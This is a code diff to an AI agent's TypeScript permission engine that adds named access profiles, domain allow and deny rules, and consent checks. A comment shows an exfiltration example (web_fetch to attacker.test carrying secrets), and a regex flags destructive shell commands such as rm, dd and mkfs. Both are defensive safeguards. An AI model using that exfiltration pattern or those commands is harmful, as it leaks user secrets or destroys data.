@@ -10,6 +10,12 @@ import type {
   PermissionRuleScope,
   Workspace,
 } from "../../../shared/types";
+import type {
+  AccessApprovalPolicy,
+  AccessNetworkMode,
+  AccessReviewer,
+  AccessSandboxMode,
+} from "../../../shared/access-profiles";
 import { TOOL_GROUPS } from "../../../shared/types";
 import { isComputerUseToolName } from "../../../shared/computer-use-contract";
 import { GuardrailManager } from "../../guardrails/guardrail-manager";
@@ -24,6 +30,7 @@ import {
 import {
   canonicalizeToolName,
   isArtifactGenerationToolName,
+  isCanonicalWriteToolName,
   isFileMutationToolName,
 } from "../tool-semantics";
 import {
@@ -31,6 +38,7 @@ import {
   extractUrlFromToolInput,
 } from "../security/export-permission-context";
 import { isLikelyNetworkShellCommand } from "../../../shared/shell-network";
+import { domainMatches } from "../../security/network-policy";
 import {
   evaluateWorkspaceFilesystemAccess,
   type AccessFilesystemOperation,
@@ -66,6 +74,8 @@ export interface PermissionEngineRequest {
     consecutiveDenials: number;
     totalDenials: number;
   };
+  /** Internal/test override for the rollout gate; callers normally use the env default. */
+  accessPolicyVersion?: AccessPolicyVersion;
 }
 
 type PermissionFacts = {
@@ -87,7 +97,17 @@ type PermissionFacts = {
   isNonWorkspaceInteraction: boolean;
   isMcp: boolean;
   isLocationAccess: boolean;
+  isExplicitConsentRequired: boolean;
 };
+
+type RuntimeAccessProfile = {
+  sandbox?: AccessSandboxMode;
+  approval?: AccessApprovalPolicy;
+  reviewer?: AccessReviewer;
+  network?: AccessNetworkMode;
+};
+
+export type AccessPolicyVersion = "legacy" | "boundary" | "shadow";
 
 const NETWORK_READ_TOOLS = new Set(["web_search", "web_fetch", "x_search"]);
 const NETWORK_CAPABLE_TOOLS = new Set(["open_url", "canvas_open_url"]);
@@ -229,10 +249,35 @@ const FILESYSTEM_WRITE_TOOLS = new Set([
 export class PermissionEngine {
   static evaluate(request: PermissionEngineRequest): PermissionEvaluationResult {
     const facts = this.buildFacts(request);
+    const profile = this.getRuntimeAccessProfile(request);
+    const policyVersion = this.getAccessPolicyVersion(request);
+
+    // Shadow evaluation is deliberately side-effect free: it compares the
+    // boundary result to the legacy decision and returns the legacy result.
+    // The caller remains responsible for deciding whether an approval request
+    // is needed, so this branch cannot create grants, prompts, or logs.
+    if (profile && policyVersion === "shadow") {
+      const boundary = this.evaluate({ ...request, accessPolicyVersion: "boundary" });
+      const legacy = this.evaluate({ ...request, accessPolicyVersion: "legacy" });
+      return {
+        ...legacy,
+        metadata: {
+          ...(legacy.metadata || {}),
+          accessPolicyVersion: "shadow",
+          boundaryDecision: boundary.decision,
+          boundaryReason: boundary.reason.summary,
+          boundaryPolicyVersion: "boundary",
+        },
+      };
+    }
+    const useNamedBoundary = Boolean(profile && policyVersion === "boundary");
     const hardDecision = this.evaluateHardPolicies(request, facts);
     if (hardDecision) {
       return {
         ...hardDecision,
+        ...(profile
+          ? { metadata: { accessPolicyVersion: policyVersion, namedBoundary: useNamedBoundary } }
+          : {}),
         suggestions: this.buildSuggestions(
           request.allowPersistence !== false && !facts.isLocationAccess,
           facts,
@@ -242,21 +287,19 @@ export class PermissionEngine {
     }
 
     if (facts.isLocationAccess) {
-      return {
+      return this.withAccessProfileApprovalPolicy(request, facts, {
         decision: "ask",
         reason: {
           type: "mode",
           mode: request.mode,
           summary: "Location access always requires explicit one-time approval.",
         },
-        suggestions: this.buildSuggestions(false, facts),
-        scopePreview: this.buildScopePreview(request, facts),
-      };
+      });
     }
 
     const matchedRule = this.findBestRule(request.rules, facts);
     if (matchedRule) {
-      return {
+      return this.withAccessProfileApprovalPolicy(request, facts, {
         decision: matchedRule.effect,
         reason: {
           type: "rule",
@@ -267,28 +310,32 @@ export class PermissionEngine {
           },
         },
         matchedRule,
-        suggestions: this.buildSuggestions(request.allowPersistence !== false, facts),
-        scopePreview: this.buildScopePreview(request, facts),
-      };
+      });
     }
 
     // `on-request` is a mandatory approval boundary, but it is not a hard
     // allow. Evaluate explicit rules first so a narrower deny rule still wins
     // over the profile's approval requirement.
     if (
-      request.workspace.permissions.accessNetworkMode === "on-request" &&
-      this.isNetworkBoundaryFact(facts)
+      (!profile || useNamedBoundary) &&
+      this.requiresNetworkApproval(request, facts) &&
+      !this.profileDomainGrantMatches(request, facts)
     ) {
-      return {
+      return this.withAccessProfileApprovalPolicy(request, facts, {
         decision: "ask",
         reason: {
           type: "workspace_capability",
           capability: "network",
           summary: "The active access profile requires approval before internet access.",
         },
-        suggestions: this.buildSuggestions(request.allowPersistence !== false, facts),
-        scopePreview: this.buildScopePreview(request, facts),
-      };
+      });
+    }
+
+    const profileDecision = useNamedBoundary
+      ? this.evaluateNamedProfileDefaults(request, facts)
+      : null;
+    if (profileDecision) {
+      return this.withAccessProfileApprovalPolicy(request, facts, profileDecision);
     }
 
     const modeDecision = this.evaluateModeDefaults(request.mode, facts);
@@ -319,6 +366,9 @@ export class PermissionEngine {
       reason: modeDecision.reason,
       suggestions: this.buildSuggestions(request.allowPersistence !== false, facts),
       scopePreview: this.buildScopePreview(request, facts),
+      ...(profile
+        ? { metadata: { accessPolicyVersion: policyVersion, namedBoundary: useNamedBoundary } }
+        : {}),
     };
   }
 
@@ -328,6 +378,7 @@ export class PermissionEngine {
   ): { decision: PermissionEffect; reason: PermissionDecisionReason } | null {
     const permissions = request.workspace.permissions || {};
     const isNetworkBoundaryFact = this.isNetworkBoundaryFact(facts);
+    const profile = this.getRuntimeAccessProfile(request);
 
     if (permissions.accessProfileUnavailable === true) {
       return {
@@ -344,6 +395,28 @@ export class PermissionEngine {
     const filesystemBoundaryDecision = this.evaluateFilesystemBoundary(request, facts);
     if (filesystemBoundaryDecision) {
       return filesystemBoundaryDecision;
+    }
+
+    const profileDomainDecision = this.evaluateProfileDomainBoundary(request, facts);
+    if (profileDomainDecision) {
+      return profileDomainDecision;
+    }
+
+    if (
+      profile?.sandbox === "read-only" &&
+      (facts.isWorkspaceWriteLike ||
+        facts.isDeleteLike ||
+        facts.isShell ||
+        this.externalFileMutationRequested(request, facts))
+    ) {
+      return {
+        decision: "deny",
+        reason: {
+          type: "workspace_capability",
+          capability: facts.isShell ? "shell" : facts.isDeleteLike ? "delete" : "write",
+          summary: "The active read-only access profile does not permit this operation.",
+        },
+      };
     }
 
     if (facts.toolName === "run_applescript" && permissions.accessProfileScoped === true) {
@@ -426,7 +499,10 @@ export class PermissionEngine {
       };
     }
 
-    if (isNetworkBoundaryFact && permissions.accessNetworkMode === "disabled") {
+    if (
+      isNetworkBoundaryFact &&
+      (permissions.accessNetworkMode === "disabled" || profile?.network === "disabled")
+    ) {
       return {
         decision: "deny",
         reason: {
@@ -438,6 +514,280 @@ export class PermissionEngine {
     }
 
     return null;
+  }
+
+  private static evaluateProfileDomainBoundary(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): { decision: PermissionEffect; reason: PermissionDecisionReason } | null {
+    if (
+      !this.getRuntimeAccessProfile(request) ||
+      !facts.normalizedDomain ||
+      !this.isNetworkBoundaryFact(facts)
+    ) {
+      return null;
+    }
+    const rules = request.workspace.permissions.accessDomainRules || [];
+    const denied = rules.find(
+      (rule) => rule.access === "deny" && domainMatches(facts.normalizedDomain, rule.pattern),
+    );
+    if (denied) {
+      return {
+        decision: "deny",
+        reason: {
+          type: "workspace_capability",
+          capability: "network",
+          summary: `The active access profile denies network access to ${facts.normalizedDomain}.`,
+          metadata: { domain: facts.normalizedDomain, policyReason: "profile_domain_denied" },
+        },
+      };
+    }
+    const allowed = rules.filter((rule) => rule.access === "allow");
+    if (
+      allowed.length > 0 &&
+      !allowed.some((rule) => domainMatches(facts.normalizedDomain, rule.pattern))
+    ) {
+      return {
+        decision: "deny",
+        reason: {
+          type: "workspace_capability",
+          capability: "network",
+          summary: `The active access profile does not allow network access to ${facts.normalizedDomain}.`,
+          metadata: { domain: facts.normalizedDomain, policyReason: "profile_domain_not_allowed" },
+        },
+      };
+    }
+    return null;
+  }
+
+  /**
+   * Read the effective named-profile dimensions from the workspace snapshot.
+   * The legacy permission mode remains an input for old persisted tasks, but
+   * once profile metadata is present it is no longer the runtime authority.
+   */
+  private static getAccessPolicyVersion(request: PermissionEngineRequest): AccessPolicyVersion {
+    const requested =
+      request.accessPolicyVersion ||
+      (typeof process !== "undefined" ? process.env.COWORK_ACCESS_POLICY_VERSION : undefined);
+    return requested === "legacy" || requested === "shadow" ? requested : "boundary";
+  }
+
+  private static getRuntimeAccessProfile(
+    request: PermissionEngineRequest,
+  ): RuntimeAccessProfile | undefined {
+    const permissions = request.workspace.permissions;
+    // `accessProfileId` is the authority marker. The additional markers cover
+    // unavailable and explicitly scoped profiles that may not have a stable
+    // id in an older serialized workspace. Merely having copied effective
+    // fields is insufficient: legacy tasks may retain those fields while
+    // still relying on their PermissionMode behavior.
+    const hasProfileAuthority =
+      (typeof permissions.accessProfileId === "string" &&
+        permissions.accessProfileId.trim().length > 0) ||
+      permissions.accessProfileScoped === true ||
+      permissions.accessFilesystemScoped === true ||
+      permissions.accessProfileUnavailable === true;
+    if (!hasProfileAuthority) return undefined;
+    return {
+      sandbox: permissions.accessSandboxMode,
+      approval: permissions.accessApprovalPolicy,
+      reviewer: permissions.accessReviewer,
+      network: permissions.accessNetworkMode,
+    };
+  }
+
+  private static withAccessProfileApprovalPolicy(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+    result: {
+      decision: PermissionEffect;
+      reason: PermissionDecisionReason;
+      matchedRule?: PermissionRule;
+      metadata?: Record<string, unknown>;
+    },
+  ): PermissionEvaluationResult {
+    const profile = this.getRuntimeAccessProfile(request);
+    const never = profile?.approval === "never";
+    const decision = never && result.decision === "ask" ? "deny" : result.decision;
+    const reason =
+      never && result.decision === "ask"
+        ? {
+            type: "other" as const,
+            summary:
+              "The active access profile is configured with never; required authority is unavailable.",
+            metadata: {
+              accessApprovalPolicy: "never",
+              originalDecision: result.decision,
+              originalReason: result.reason.summary,
+            },
+          }
+        : result.reason;
+    return {
+      decision,
+      reason,
+      ...(result.matchedRule ? { matchedRule: result.matchedRule } : {}),
+      metadata: {
+        ...(result.metadata || {}),
+        ...(profile
+          ? {
+              accessPolicyVersion: this.getAccessPolicyVersion(request),
+              namedBoundary: this.getAccessPolicyVersion(request) === "boundary",
+            }
+          : {}),
+      },
+      suggestions:
+        decision === "ask"
+          ? this.buildSuggestions(
+              request.allowPersistence !== false && !facts.isLocationAccess,
+              facts,
+            )
+          : [],
+      scopePreview: this.buildScopePreview(request, facts),
+    };
+  }
+
+  private static requiresNetworkApproval(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): boolean {
+    if (!this.isNetworkBoundaryFact(facts)) return false;
+    const profile = this.getRuntimeAccessProfile(request);
+    // A profile that explicitly declares `network: "on-request"` has asked to
+    // approve every network boundary crossing, read-only included. web_fetch is
+    // the canonical exfiltration primitive — `web_fetch("https://attacker.test/
+    // ?d=<secrets>")` is a read — so exempting it under the profile whose whole
+    // stated purpose is asking first defeats that profile. This must be decided
+    // before the routine-read lane below.
+    if (profile?.network === "on-request") return true;
+    // Public, read-only web lookups are the same low-risk read lane already
+    // allowed by the legacy default mode. Keep that parity for named profiles
+    // that did not opt into on-request networking, so research citations do not
+    // become modal interruptions. Explicit domain rules, credential use, and
+    // hard network policy still run before this check.
+    if (profile && this.isRoutineNetworkRead(facts)) return false;
+    return request.workspace.permissions.accessNetworkMode === "on-request";
+  }
+
+  private static isRoutineNetworkRead(facts: PermissionFacts): boolean {
+    if (
+      !facts.isNetworkAccess ||
+      !facts.isReadOnly ||
+      facts.isExplicitConsentRequired ||
+      facts.isNonWorkspaceInteraction ||
+      facts.isMcp
+    ) {
+      return false;
+    }
+    return (
+      NETWORK_READ_TOOLS.has(facts.toolName) ||
+      (facts.toolName === "http_request" && facts.isReadOnly)
+    );
+  }
+
+  private static profileDomainGrantMatches(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): boolean {
+    if (!facts.normalizedDomain || !facts.isNetworkAccess || facts.isExplicitConsentRequired) {
+      return false;
+    }
+    if (!this.getRuntimeAccessProfile(request)) return false;
+    const rules = request.workspace.permissions.accessDomainRules || [];
+    const allows = rules.filter((rule) => rule.access === "allow");
+    return (
+      allows.length > 0 &&
+      allows.some((rule) => domainMatches(facts.normalizedDomain, rule.pattern))
+    );
+  }
+
+  private static externalFileCrossesBoundary(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): boolean {
+    if (!facts.isExternalFileAccess) return false;
+    const operations = this.extractFilesystemOperations(request, facts.toolName);
+    if (operations.length === 0) return true;
+    return operations.some(
+      (candidate) =>
+        evaluateWorkspaceFilesystemAccess(request.workspace, candidate.path, candidate.operation)
+          .reason === "outside_workspace",
+    );
+  }
+
+  private static externalFileMutationRequested(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): boolean {
+    if (!facts.isExternalFileAccess) return false;
+    const operations = this.extractFilesystemOperations(request, facts.toolName);
+    // An external-file approval with no classified operation is ambiguous;
+    // keep read-only profiles fail-closed for that shape. Known reads still
+    // reach the normal external-consent/rule path below.
+    return operations.length === 0 || operations.some(({ operation }) => operation !== "read");
+  }
+
+  /**
+   * Named profiles use the actual boundary dimensions above instead of
+   * translating them into a retired PermissionMode. In-scope local mutation
+   * and sandboxed shell work are ordinary authorization; only a concrete
+   * boundary crossing or consent-bearing operation asks.
+   */
+  private static evaluateNamedProfileDefaults(
+    request: PermissionEngineRequest,
+    facts: PermissionFacts,
+  ): { decision: PermissionEffect; reason: PermissionDecisionReason } | null {
+    const profile = this.getRuntimeAccessProfile(request);
+    if (!profile) return null;
+
+    if (
+      facts.isExplicitConsentRequired ||
+      this.externalFileCrossesBoundary(request, facts) ||
+      facts.isNonWorkspaceInteraction
+    ) {
+      return {
+        decision: "ask",
+        reason: {
+          type: "other",
+          summary: "This operation requires explicit consent at the active access boundary.",
+          metadata: {
+            accessApprovalPolicy: profile.approval,
+            reviewer: profile.reviewer,
+          },
+        },
+      };
+    }
+
+    // No routine-read carve-out here either: a profile that declares
+    // `network: "on-request"` asks before any internet access, so a read-only
+    // web_fetch cannot fall through to the terminal allow below. An explicit
+    // user-configured domain allow rule is still a valid exemption.
+    if (
+      facts.isNetworkAccess &&
+      profile.network === "on-request" &&
+      !this.profileDomainGrantMatches(request, facts)
+    ) {
+      return {
+        decision: "ask",
+        reason: {
+          type: "workspace_capability",
+          capability: "network",
+          summary: "The active access profile requires approval before internet access.",
+        },
+      };
+    }
+
+    return {
+      decision: "allow",
+      reason: {
+        type: "other",
+        summary: "The active access profile allows this operation within its granted boundary.",
+        metadata: {
+          accessSandboxMode: profile.sandbox,
+          accessApprovalPolicy: profile.approval,
+          reviewer: profile.reviewer,
+        },
+      },
+    };
   }
 
   /**
@@ -810,6 +1160,24 @@ export class PermissionEngine {
       ((toolName === "web_fetch" || toolName === "http_request") &&
         typeof credentialId === "string" &&
         credentialId.trim().length > 0);
+    const isExplicitConsentRequired =
+      (isShell &&
+        (DANGEROUS_COMMAND_PATTERNS.some((pattern) => pattern.test(normalizedCommand)) ||
+          /(^|\s)(sudo|rm|dd|mkfs|diskutil|shutdown|reboot|killall)\b/i.test(normalizedCommand))) ||
+      approvalType === "risk_gate" ||
+      approvalType === "delete_file" ||
+      approvalType === "delete_multiple" ||
+      approvalType === "data_export" ||
+      approvalType === "external_service" ||
+      approvalType === "location_access" ||
+      approvalType === "protected_credential" ||
+      isDeleteLike ||
+      isDataExport ||
+      isProtectedCredential ||
+      isLocationAccess ||
+      toolName.endsWith("_action") ||
+      toolName === "voice_call" ||
+      toolName.startsWith("mcp_");
     const isWorkspaceWriteLike = this.isWorkspaceWriteTool(toolName);
     const isExternalSideEffect =
       (approvalType === "external_service" && !isWorkspaceWriteLike) ||
@@ -835,7 +1203,12 @@ export class PermissionEngine {
     const isMcp = toolName.startsWith("mcp_");
     const isMutatingTool = this.isMutatingTool(toolName);
     const isWriteLike =
-      isDeleteLike || isShell || isExternalSideEffect || isExternalFileAccess || isMutatingTool;
+      isDeleteLike ||
+      isShell ||
+      isExternalSideEffect ||
+      isExternalFileAccess ||
+      isExplicitConsentRequired ||
+      isMutatingTool;
     const isReadOnly = !isWriteLike;
 
     return {
@@ -857,11 +1230,21 @@ export class PermissionEngine {
       isNonWorkspaceInteraction,
       isMcp,
       isLocationAccess,
+      isExplicitConsentRequired,
     };
   }
 
   private static isWorkspaceWriteTool(toolName: string): boolean {
     const canonicalToolName = canonicalizeToolName(toolName);
+    // TOOL_GROUPS is the app's canonical taxonomy and is checked first. The
+    // semantics table below it covers only 14 tools, which is how
+    // organize_folder, compile_latex, monty_transform_file,
+    // batch_image_process and scratchpad_write — all declared in
+    // group:write — ended up classified as read-only, and therefore
+    // auto-allowed in default mode and permitted in Plan mode.
+    if (isCanonicalWriteToolName(canonicalToolName)) {
+      return true;
+    }
     if (
       isArtifactGenerationToolName(canonicalToolName) ||
       isFileMutationToolName(canonicalToolName)
